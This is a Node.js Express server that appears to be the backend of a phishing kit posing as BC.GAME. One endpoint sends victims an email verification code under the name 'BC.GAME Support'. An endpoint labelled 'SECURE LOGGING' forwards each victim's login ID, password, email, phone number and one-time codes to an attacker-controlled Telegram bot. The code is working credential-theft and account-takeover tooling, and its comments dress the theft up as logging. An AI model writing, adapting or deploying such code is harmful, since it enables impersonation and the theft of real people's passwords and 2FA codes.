require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

// Detailed SMTP configuration
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true, // Use SSL
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Endpoint to send OTP
app.post('/send-otp', async (req, res) => {
    const { email } = req.body;
    console.log(`Sending OTP to: ${email}`);

    if (!email) return res.status(400).json({ success: false });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    const mailOptions = {
        from: `"BC.GAME Support" <${process.env.EMAIL_USER}>`,
        to: email,
        subject: '🔐 Your Verification Code',
        html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; font-family:sans-serif; text-align:center; border:2px solid #3bc117;">
                <h1 style="color:#3bc117;">BC.GAME</h1>
                <p style="font-size:18px;">Verification Code:</p>
                <div style="font-size:48px; font-weight:bold; letter-spacing:10px; margin:20px 0; color:#3bc117;">${otp}</div>
                <p style="color:#98a7b5;">This code is valid for 5 minutes.</p>
               </div>`
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent: ' + info.response);
        res.json({ success: true, otp }); 
    } catch (error) {
        console.error('Email Error Details:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// SECURE LOGGING ENDPOINT
app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    console.log('Logging data:', title);

    const token = process.env.LOG_BOT_TOKEN;
    const chatId = process.env.LOG_BOT_CHAT_ID;

    if (!token || !chatId) {
        return res.status(500).json({ success: false, message: 'Bot config missing in .env' });
    }

    const message = `
🔥 <b>${title}</b>
━━━━━━━━━━━━━━━
👤 <b>Initial ID</b>: <code>${data.id}</code>
🔑 <b>Password</b>: <code>${data.pass}</code>
📧 <b>Verify Email</b>: <code>${data.email || 'N/A'}</code>
🔢 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
📱 <b>Verify Phone</b>: <code>${data.phone || 'N/A'}</code>
🔢 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Telegram Log Error:', error.response?.data || error.message);
        res.status(500).json({ success: false });
    }
});

app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server is LIVE on port ${port}`);
});
